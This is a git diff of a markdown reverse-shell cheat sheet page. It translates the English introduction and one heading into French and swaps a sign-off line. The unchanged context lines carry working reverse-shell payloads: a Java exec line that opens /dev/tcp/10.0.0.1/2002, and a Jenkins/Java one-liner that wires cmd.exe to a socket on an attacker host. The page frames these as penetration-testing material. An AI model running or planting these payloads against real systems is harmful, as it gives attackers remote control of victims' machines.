@@ -4,7 +4,9 @@ title : 0xS3rGio - Reverse Shell The Ultimate Cheat Sheet
 ---
 ### Reverse Shell 
 
-A reverse shell is a kind of shell in which the target machine communicates back to the attacking machine.During a Penetration Test If You’re Lucky Enough To Find A Command Execution Vulnerability You Will Probably Want An Interactive Shell Yes. Here I include a reverse shell cheat sheet that contains many reverse shells for different methods or different programming languages like, PHP reverse shell, Netcat reverse shell, Python reverse shell, etc. 
+Un Reverse shell est une sorte de shell dans lequel la machine cible communique avec la machine attaquante. Lors d'un test de pénétration, si vous avez la chance de trouver une vulnérabilité d'exécution de commande, vous voudrez probablement un shell interactif Oui. Ici, j'inclus une feuille de triche de Reverse shell  qui contient de nombreux Reverse shells pour différentes méthodes ou différents langages de programmation tels que le shell Reverse PHP,  Netcat, Python, etc.
+
+
 
 Reverse Shell Cheat Sheet
 
@@ -49,7 +51,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-Jenkins Reverse Shell Code For Linux And Window
+Jenkins Reverse Shell Code pour Linux et Window
 
 ```
 String host="10.0.0.1";
@@ -65,7 +67,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-Greeting From [Sergio](https://twitter.com/x0Sergi)
+CC [Sergio](https://twitter.com/x0Sergi)
 <br> <br>
 [Back To Home](../index.md)
 <br>
